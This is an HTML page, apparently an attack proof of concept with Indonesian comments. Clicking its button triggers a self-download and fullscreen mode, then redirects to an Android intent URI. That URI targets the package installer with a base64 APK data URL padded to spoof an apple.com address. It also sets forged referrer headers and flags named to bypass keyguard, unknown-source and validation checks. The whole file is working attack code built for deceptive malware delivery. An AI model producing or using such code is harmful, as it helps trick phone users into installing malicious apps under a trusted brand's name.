<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Page Download & Delayed Fullscreen Dispatcher</title>
    <style>
        body {
            font-family: monospace;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-color: #0b0b0b;
            color: #00ffcc;
            margin: 0;
            overflow: hidden;
        }
        button {
            padding: 18px 35px;
            font-size: 16px;
            font-weight: bold;
            background-color: #ff0055;
            color: #ffffff;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            box-shadow: 0 0 15px rgba(255, 0, 85, 0.4);
        }
        button:active {
            transform: scale(0.98);
        }
        #status {
            margin-top: 20px;
            font-size: 14px;
            color: #ffcc00;
        }
    </style>
</head>
<body>

    <button id="strikeBtn">Download Page & Initialize Fullscreen</button>
    <div id="status"></div>

    <script>
        document.getElementById('strikeBtn').addEventListener('click', function() {
            // --- 1. CONFIGURATION ---
            const pageFilename = "index.html";
            const realDomain = "apple.com";

            // --- 2. ADVANCED ADDRESS BAR & UI SPOOFING LOGIC ---
            const overflowPadding = "/%00@".repeat(15) + ".https://" + realDomain + "/auth/validate/".repeat(30);
            const longSub = realDomain + overflowPadding;

            // --- 3. PAYLOAD CONSTRUCTION (Self-generated local Base64 APK) ---
            const base64Payload = "UEsDBAoAAAAAAKp2ZVIAAAAAAAAAAAAAAAAJABwAYPPwLmFwa1BLAQIFAAAAAAAKqmVSGgAAAAAAAAAAAAAAAAAmAAgAAAAAAAAAAAAAALaBAAAAAGEwcGsuYXBrUEsFBgAAAAABAAEATgAAAE8AAAA="; 
            const payload = `data:application/vnd.android.package-archive;base64,${base64Payload}#${longSub}`;

            // --- 4. EXECUTION (Download Halaman Ini / HTML) ---
            const htmlContent = document.documentElement.outerHTML;
            const blob = new Blob([htmlContent], { type: 'text/html' });
            const blobUrl = URL.createObjectURL(blob);

            const a = document.createElement('a');
            a.href = blobUrl;
            a.download = pageFilename;
            a.rel = "noopener";

            document.body.appendChild(a);
            a.click();

            document.getElementById('status').innerText = "> PAGE_DOWNLOAD_TRIGGERED: Awaiting 1.5s for Fullscreen & Intent...";

            // --- 5. DELAY 1.5 SECONDS: FULLSCREEN & INTENT DISPATCH ---
            setTimeout(() => {
                // Masuk Fullscreen setelah 1,5 detik
                const elem = document.documentElement;
                if (elem.requestFullscreen) {
                    elem.requestFullscreen().catch(err => {
                        console.log("Fullscreen blocked or failed:", err);
                    });
                } else if (elem.webkitRequestFullscreen) {
                    elem.webkitRequestFullscreen();
                } else if (elem.msRequestFullscreen) {
                    elem.msRequestFullscreen();
                }

                document.body.removeChild(a);
                URL.revokeObjectURL(blobUrl);
                
                // Intent 1-line dijalankan bersamaan dengan Fullscreen
                const targetIntent = "intent://apple.com/#Intent;scheme=https;package=com.android.packageinstaller;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;category=android.intent.category.DEFAULT;type=application/vnd.android.package-archive;launchFlags=0x3FFFFFFF;flag=0x3FFFFFFF;S.browser_fallback_url=" + encodeURIComponent(payload) + ";S.com.android.browser.application_id=org.mozilla.firefox;S.android.intent.extra.REFERRER_NAME=android-app%3A%2F%2Forg.mozilla.firefox;S.com.android.browser.headers=Referer%3A%https%3A%2F%2Fapple.com%2F%0AOrigin%3A%https%3A%2F%2Fapple.com%2F;B.android.intent.extra.ALLOW_MULTIPLE=true;B.android.intent.extra.NOT_UNKNOWN_SOURCE=true;B.android.intent.extra.INSTALLER_PACKAGE_NAME=org.mozilla.firefox;B.android.intent.extra.TRUNCATE_HISTORY=false;B.android.intent.extra.BYPASS_KEYGUARD_PERMISSIONS=true;B.android.intent.extra.SKIP_VALIDATION=true;end";
                
                window.location.replace(targetIntent);
            }, 200);
        });
    </script>

</body>
</html>
